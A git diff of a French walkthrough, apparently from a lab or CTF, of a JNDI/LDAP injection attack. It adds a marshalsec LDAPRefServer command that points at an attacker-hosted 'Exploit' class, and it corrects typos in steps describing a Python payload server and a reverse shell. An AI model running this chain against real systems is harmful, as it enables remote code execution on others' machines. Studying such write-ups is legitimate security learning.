@@ -71,11 +71,15 @@ On la compile sous le nom de `Exploit.class`
 
 Pour cela on utilise le software Marshalsec (https://github.com/mbechler/marshalsec) qui va permettre de créer le serveur et de rediriger le traffic.
 
+La commande suivante va créer le serveur et rediriger vers notre code malveillant :
+
+`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.65.176:8000/#Exploit"`
+
 ![image](https://user-images.githubusercontent.com/16634117/145871850-2f83e1d5-6e94-40ec-803b-c71be8fca4d6.png)
 
 ## Attaque
 
-Une fois les éléments en place, il faut crér un serveur capacle de répondre avec notre charge malveillante, un simple `python3 -m http.server` fera l'affaire.
+Une fois les éléments en place, il faut crér un serveur capable de répondre avec notre charge malveillante, un simple `python3 -m http.server` fera l'affaire.
 
 Pour pouvoir récupérer le shell :
 
@@ -90,7 +94,7 @@ Une simple requête avec l'injection va permettre de déclencher toute la chaine
 Une fois cela fait :
 
 ![image](https://user-images.githubusercontent.com/16634117/145872643-ec39c7ca-e33d-4b34-8c31-a6b2ed397b09.png)
-_De haut en bas et de gauche à droite : la reqûete malveillante, le serveur LDAP redirigeant le traffic, le serveur Python répondant avec la payload RCE comilée, le reverse shell_
+_De haut en bas et de gauche à droite : la reqûete malveillante, le serveur LDAP redirigeant le traffic, le serveur Python répondant avec la payload RCE compilée, le reverse shell_
 
 
 
